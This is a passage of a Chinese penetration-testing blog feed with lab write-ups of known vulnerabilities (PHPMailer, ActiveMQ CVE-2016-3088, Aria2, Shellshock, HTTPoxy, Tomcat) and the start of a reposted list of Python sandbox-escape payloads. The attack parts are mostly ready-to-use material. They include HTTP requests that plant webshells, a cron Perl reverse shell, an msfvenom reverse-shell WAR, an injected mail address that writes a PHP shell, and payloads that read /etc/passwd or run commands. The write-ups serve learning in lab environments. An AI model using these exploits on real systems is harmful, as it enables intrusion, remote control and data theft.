class="title function_ invoke__">send</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message could not be sent.&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Mailer Error: &#x27;</span> . <span class="variable">$mail</span>-&gt;ErrorInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message has been sent&#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$mail</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$address</span> = <span class="string">&quot;aaa( -X/home/www/success.php )@qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">send</span>(<span class="variable">$address</span>);</span><br></pre></td></tr></table></figure><p>执行之后可以发现已经写了shell了 (虽然我并没有执行成功...) 然后phithon师傅还给了个权限不够的时候的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa( -X/home/www/success.php -OQueueDirectory=/tmp )@qq.com</span><br></pre></td></tr></table></figure><h2 id="activemq任意文件写入漏洞cve-2016-3088">ActiveMQ任意文件写入漏洞(CVE-2016-3088)</h2><h3 id="原理-1">原理</h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。 fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现： 其使用率并不高 文件操作容易出现漏洞 所以，ActiveMQ在<strong>5.12.x~5.13.x</strong>版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在<strong>5.14.0版本以后，彻底删除了fileserver应用</strong>。 在测试过程中，可以关注ActiveMQ的版本，避免走弯路。 本次漏洞出现在fileserver应用中,fileserver支持写入文件,同时支持移动文件,所以我们只要写入一个文件然后移动就可以造成任意文件写入. 参考redis的getshell,同样有几种利用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.写入webshell</span><br><span class="line">2.写入cron或者ssh key等</span><br><span class="line">3.写入jar或jetty.xml等库和配置文件(不太懂)</span><br></pre></td></tr></table></figure><h3 id="搭环境-1">搭环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后环境会监听8161端口和61616端口,其中8161是web控制台端口,而漏洞就出现在这个端口,我们访问<code>http://192.168.0.104:8161</code>看到web页面即成功运行 <img src="/images/2018/07/vul-1.jpg" alt="blacsheep" /> 其中admin页面的默认登录帐号密码都是admin</p><h3 id="攻击-1">攻击</h3><h4 id="写webshell">写webshell</h4><p>写webshell要求登录进去,默认帐号密码admin,访问<code>http://ip_address:8161/admin/test/systemProperties.jsp</code>然后得到ActiveMQ的默认路径: <img src="/images/2018/07/vul-2.jpg" alt="blacsheep" /> 然后传webshell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36164</span><br><span class="line"></span><br><span class="line"><span class="language-gams"><span class="function"><span class="title">webshell</span></span>...</span></span><br></pre></td></tr></table></figure><figure><img src="/images/2018/07/vul-3.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/api/shell.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/vul-4.jpg" alt="blacsheep" /> 然后连上去就可以了 <img src="/images/2018/07/vul-5.jpg" alt="blacsheep" /></p><h4 id="写入crontab自动反弹shell">写入crontab,自动反弹shell</h4><p>首先传cron配置文件,然后移动到/etc/cron.d/root</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>248</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;10.0.0.1&quot;</span>;<span class="variable">$p</span>=<span class="number">21</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br><span class="line"><span class="language-tcl"><span class="comment">##</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到反弹的shell <img src="/images/2018/07/vul-6.jpg" alt="blacsheep" /></p><h3 id="分析-1">分析</h3><p>没啥好分析的,就是一个对任意文件写的简单利用</p><h2 id="aria2-任意文件写入漏洞">Aria2 任意文件写入漏洞</h2><h3 id="原理-2">原理</h3><p>aria2是一个命令行下的轻量级下载工具,内建xml-rpc和json-rpc的接口,在有权限的情况下我们可以操作接口来下载文件,将文件下载到任意目录,造成任意文件写入 参考文章:<a href="https://paper.seebug.org/120/" title="https://paper.seebug.org/120/">https://paper.seebug.org/120/</a></p><h3 id="搭环境-2">搭环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>6800是aria2的rpc默认端口,环境启动之后访问<code>http://your_ip:6800</code>发现服务已经启动并且返回404</p><h3 id="攻击-2">攻击</h3><p>由于这里需要进行rpc通信,比较麻烦,使用一个第三方的gui <a href="https://github.com/binux/yaaw" title="https://github.com/binux/yaaw">https://github.com/binux/yaaw</a> 使用非常简单,解压之后打开index即可,然后进行简单配置 <img src="/images/2018/07/vul-8.jpg" alt="blacsheep" /> <img src="/images/2018/07/vul-9.jpg" alt="blacsheep" /> 然后我们只用新建下载任务,就可以将任务目标下载到服务器的指定位置了,比如我们写一个文件到/etc/cron.d下,让它执行一个反弹shell的操作 <img src="/images/2018/07/vul-10.jpg" alt="blacsheep" /> 然后add,成果的话会显示 <img src="/images/2018/07/vul-11.jpg" alt="blacsheep" /> 然后脸上shell文件里面写的ip即可拿到shell <img src="/images/2018/07/vul-7.jpg" alt="blacsheep" /></p><h3 id="分析-2">分析</h3><p>在未设置任何安全措施的情况下，Aria2 RPC Server 可以接受任何未知来源的请求指令，并予以下载。即使存在诸如--rpc-secret、--rpc-user、--rpc-passwd之类的安全措施，也可以通过社会工程学手段进行攻击。通过 Aria2 RPC Server，可以进行 SSRF、Arbitrary File Write 等 Web 攻击手法，获取服务器权限。 其实说到底还是安全认证没做好,这个就是一个裸的任意文件上传,没啥好说的,做好认证的话可能会好一些</p><h2 id="shell破壳漏洞cve-2014-6271">Shell破壳漏洞(CVE-2014-6271)</h2><h3 id="原理-3">原理</h3><p>目前的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p><h3 id="搭环境-3">搭环境</h3><p>还是用的vulhub里面的docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="攻击-3">攻击</h3><p>这个漏洞本来是shell里环境变量的漏洞,不过如果第三方软件用到了shell,那么就可以导致问题的出现,比较典型的是apache,总的原理图如下 <img src="/images/2018/07/vul-12.png" alt="blacsheep" /></p><h4 id="本地测试">本地测试</h4><p>可以在shell里面执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#x27; bash -c &quot;echo test&quot;</span><br></pre></td></tr></table></figure><p>如果出现了<code>Vulnerable CVE-2014-6271</code>则存在此漏洞,比如 <img src="/images/2018/07/vul-13.png" alt="blacsheep" /></p><h4 id="远程利用">远程利用</h4><p>如果某apache利用的是shell的解析,而且shell版本很低的话,就可以导致任意命令执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/victim.cgi</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.104</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">x</span><span class="punctuation">: </span>() &#123; : ; &#125;;a=`/bin/cat /etc/passwd`;echo $a;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><img src="/images/2018/07/vul-14.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="分析-3">分析</h3><p>以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断 补丁中已经修复 <img src="/images/2018/07/vul-15.jpg" alt="blacsheep" /></p><h2 id="httpoxy漏洞cve-2016-5385">HTTPoxy漏洞(CVE-2016-5385)</h2><h3 id="原理-4">原理</h3><p>参考<a href="http://www.laruence.com/2016/07/19/3101.html" title="http://www.laruence.com/2016/07/19/3101.html">http://www.laruence.com/2016/07/19/3101.html</a> 漏洞原因简而言之就是cgi(fastcgi)要将用户传入的所有http头都加上<code>HTTP_</code>的前缀注册环境变量,而有些库会用到环境变量里面的<code>HTTP_PROXY</code>来作为http的代理,那么就会导致恶意用户提交恶意头部来窃取数据包中的敏感信息. PHP5.6.24修复了此漏洞,所以本次采用PHP5.6.23</p><h3 id="搭环境-4">搭环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后访问<code>http://your_ip/index.php</code>就可以看到origin的服务器ip</p><h3 id="攻击-4">攻击</h3><p>我们在头部加上PROXY部分</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.104</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">PROXY</span><span class="punctuation">: </span>http://xx.xx.xx.xx:xx</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后vps上面转发的时候收到包 <img src="/images/2018/07/vul-16.jpg" alt="blacsheep" /></p><h3 id="分析-4">分析</h3><p>简而言之就是php某些库进行网络访问的时候会用到名为<code>HTTP_PROXY</code>的环境变量作为代理,而这个变量在cgi中可控,从而导致一些问题. 避免方式: 如果是nginx的话可以加上<code>fastcgi_param HTTP_PROXY "";</code> 如果是库的作者那么请不要相信<code>HTTP_PROXY</code>的环境变量</p><h2 id="tomcat7弱口令后台getshell">tomcat7弱口令后台getshell</h2><h3 id="原理-5">原理</h3><p>tomcat如果登录到后台且没有关闭manage功能,那么就可以通过部署war文件来getshell tomcat的后台功能</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul><h3 id="搭环境-5">搭环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="攻击-5">攻击</h3><p>首先进入页面,登录后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">帐号密码都是tomcat</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/2018-09-03-17-34-39屏幕截图.png" alt="blacsheep" /> 然后deploy一个war文件 <img src="/images/2018/07/2018-09-03-17-36-19屏幕截图.png" alt="blacsheep" /> 其中war文件可以用msfvenom生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=your_vps_ip LPORT=your_vps_port -f raw&gt;shell.jsp</span><br></pre></td></tr></table></figure><p>然后就生成了jsp的木马 然后zip打包成war</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -o shell.war shell.jsp</span><br></pre></td></tr></table></figure><p>然后去部署一下war文件,访问一下页面就可以反弹shell到你的vps上了 <img src="/images/2018/07/2018-09-03-17-41-50屏幕截图.png" alt="blacsheep" /></p><h3 id="分析-5">分析</h3><p>漏洞是由于tomcat后台的弱口令以及部署功能所导致的,解决方法可以是使用较强的密码,且manage页面本来是只允许本地访问,由于人为的修改所以可以被其他人访问 注意口令强度以及不要随意修改配置文件就好</p><h2 id="cve-2017-12615tomcat用put写shell">CVE-2017-12615(tomcat用PUT写shell)</h2><h3 id="原理-6">原理</h3><p>tomcat的配置文件中的readonly被设置为了false导致可以写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><h3 id="搭环境-6">搭环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="攻击-6">攻击</h3><p>用curl来put一个文件上去 <img src="/images/2018/07/2018-09-04-09-43-43屏幕截图.png" alt="blacsheep" /> 然后put一个jsp文件上去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d @jsp.jsp &quot;http://127.0.0.1:8080/321.jsp&quot;</span><br></pre></td></tr></table></figure><p>发现405了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;</span><br><span class="line">            HTTP Status 405 – Method Not Allowed</span><br><span class="line">        &lt;/title&gt;</span><br><span class="line">        &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;</span><br><span class="line">            HTTP Status 405 – Method Not Allowed</span><br><span class="line">        &lt;/h1&gt;</span><br><span class="line">        &lt;hr class=&quot;line&quot;&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;b&gt;Type&lt;/b&gt; Status Report</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;b&gt;Message&lt;/b&gt; JSPs only permit GET POST or HEAD</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;b&gt;Description&lt;/b&gt; The method received in the request-line is known by the origin server but not supported by the target resource.</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;hr class=&quot;line&quot;&gt;</span><br><span class="line">        &lt;h3&gt;</span><br><span class="line">            Apache Tomcat/8.5.19</span><br><span class="line">        &lt;/h3&gt;⏎</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>尝试文件名绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d @jsp.jsp &quot;http://127.0.0.1:8080/321.jsp/&quot;</span><br></pre></td></tr></table></figure><p>然后拿到shell <img src="/images/2018/07/2018-09-04-10-43-47屏幕截图.png" alt="blacsheep" /></p><h3 id="分析-6">分析</h3><p>链接:<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html" title="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(转)python沙盒逃逸(payload总结)</title>
      <link href="/2018/07/02/%E8%BD%ACpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8payload%E6%80%BB%E7%BB%93/"/>
      <url>/2018/07/02/%E8%BD%ACpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8payload%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>原地址 <a href="http://foreversong.cn/archives/1201" title="http://foreversong.cn/archives/1201">http://foreversong.cn/archives/1201</a></p><h3 id="读文件">读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br><span class="line"><span class="comment"># &lt;type &#x27;file&#x27;&gt;读取文件</span></span><br></pre></td></tr></table></figure><h3 id="写文件">写文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;123.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;asdfqwer&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;type &#x27;file&#x27;&gt;写文件</span></span><br></pre></td></tr></table></figure><h3 id="命令执行">命令执行</h3><h4 id="warnings.catch_warnings">warnings.catch_warnings</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;  命令执行</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;  命令执行</span></span><br></pre></td></tr></table></figure><h4 id="timeit">timeit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;),number=1&quot;</span>)</span><br></pre></td></tr></table></figure><p>timeit库用来计时,计算函数的完成时间,后面的number表示函数运行的次数 这个就和盲注差不多了,代码执行但是无回显,可以利用相似的payload,比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;if [ $(whoamicut -c 1) = y ];then sleep 2;fi;&#x27;)&quot;</span>, number = <span class="number">1</span>)</span><br><span class="line"><span class="number">2.016458034515381</span></span><br><span class="line"></span><br><span class="line">timeit.timeit(<span 